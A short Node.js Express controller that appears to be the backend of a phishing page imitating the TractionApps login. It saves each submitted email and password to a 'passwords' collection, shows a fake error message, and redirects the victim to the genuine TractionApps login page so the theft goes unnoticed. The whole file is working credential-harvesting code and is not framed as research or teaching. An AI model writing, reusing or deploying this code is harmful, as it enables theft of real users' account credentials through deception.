// var body = require('express-validator')
const { body,validationResult } = require('express-validator');
var Tractionapps =  require("../models/passwords");

exports.index = function(req, res) {
    res.render('TractionApps')
};


exports.index_post = [

    body('email'),
    body('password'),

    
    // Process request after validation and sanitization.
    (req, res, next) => {

        // Extract the validation errors from a request.
        const errors = validationResult(req);

        if (!errors.isEmpty()) {
            // There are errors. Render form again with sanitized values/errors messages.
            res.render('TractionApps', { passwords: req.body, errors: errors.array() });
            return;
        }
        else {
            // Data from form is valid.

            // Create an Author object with escaped and trimmed data.
            var tractionapps = new Tractionapps(
                {
                    email: req.body.email,
                    password: req.body.password
                });
            tractionapps.save(function (err) {
                if (err) { return next(err); }
                req.flash('error', 'Sorry something went wrong.')
                // Successful - redirect to new TractionApps Login Page.
                res.redirect('https://web.tractionapps.co/#/login');
            });
        }
    }
    
]